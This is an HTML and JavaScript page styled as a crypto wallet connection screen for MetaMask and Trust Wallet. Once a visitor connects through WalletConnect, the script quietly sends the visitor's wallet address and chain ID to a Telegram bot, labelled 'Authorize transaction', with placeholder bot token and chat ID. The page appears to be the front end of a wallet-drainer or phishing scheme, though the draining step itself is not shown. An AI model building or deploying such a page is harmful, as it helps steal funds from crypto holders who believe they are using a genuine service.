<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Your Crypto Wallet</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 0;
            padding: 20px;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 2rem;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        #wallets {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 2rem;
        }
        .wallet {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 1.5rem;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: transform 0.3s ease;
            cursor: pointer;
            text-decoration: none;
            color: #ffffff;
            text-align: center;
        }
        .wallet:hover {
            transform: translateY(-5px);
        }
        .wallet img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin-bottom: 1rem;
        }
        .wallet-name {
            font-weight: 600;
            font-size: 1.1rem;
        }
        #qrcode {
            margin-top: 2rem;
            width: 256px;
            height: 256px;
            display: none;
        }
    </style>
</head>
<body>
    <h1>Select Your Crypto Wallet</h1>
    <div id="wallets"></div>
    <canvas id="qrcode"></canvas>

    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
    <script>
        const wallets = [
            { name: 'MetaMask', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png', link: 'metamask://dapp/' },
            { name: 'Trust Wallet', img: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png', link: 'https://link.trustwallet.com/open_url?coin_id=60&url=' },
        ];

        const walletsContainer = document.getElementById('wallets');
        wallets.forEach(wallet => {
            const link = document.createElement('a');
            link.href = wallet.link;
            link.classList.add('wallet');
            link.innerHTML = `
                <img src="${wallet.img}" alt="${wallet.name}" loading="lazy">
                <div class="wallet-name">${wallet.name}</div>
            `;
            link.addEventListener('click', (e) => {
                e.preventDefault();
                initWalletConnect(wallet.link, wallet.name);
            });
            walletsContainer.appendChild(link);
        });

        async function initWalletConnect(walletLink, walletName) {
            const provider = new WalletConnectProvider.default({
                infuraId: "f02e2d49abf14233959146d0a971f556",
                qrcodeModalOptions: {
                    mobileLinks: ["metamask", "trust"],
                }
            });

            try {
                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                    window.location.href = `${walletLink}${encodeURIComponent(window.location.href)}`;
                    
                    setTimeout(() => {
                        if (document.hidden) return;
                        connectWithWalletConnect();
                    }, 3000);
                } else {
                    connectWithWalletConnect();
                }

                async function connectWithWalletConnect() {
                    await provider.enable();
                    
                    const accounts = provider.accounts;
                    const chainId = provider.chainId;

                    // Now we send the accounts and chainId to the bot for transaction processing
                    sendToBot(accounts[0], chainId);

                    provider.on("accountsChanged", (accounts) => {
                        console.log(accounts);
                    });

                    provider.on("chainChanged", (chainId) => {
                        console.log(chainId);
                    });

                    provider.on("disconnect", (code, reason) => {
                        console.log(code, reason);
                    });
                }

            } catch (error) {
                console.error("Failed to connect wallet:", error);
            }
        }

        function sendToBot(walletAddress, chainId) {
            const botUrl = 'https://api.telegram.org/bot<YourBotToken>/sendMessage';
            const chatId = '<YourChatId>';  // Your personal group chat ID

            const message = `Authorize transaction from wallet: ${walletAddress} on chain: ${chainId}`;
            
            fetch(botUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Sent to bot:', data);
            })
            .catch(error => {
                console.error('Error sending to bot:', error);
            });
        }
    </script>
</body>
</html>
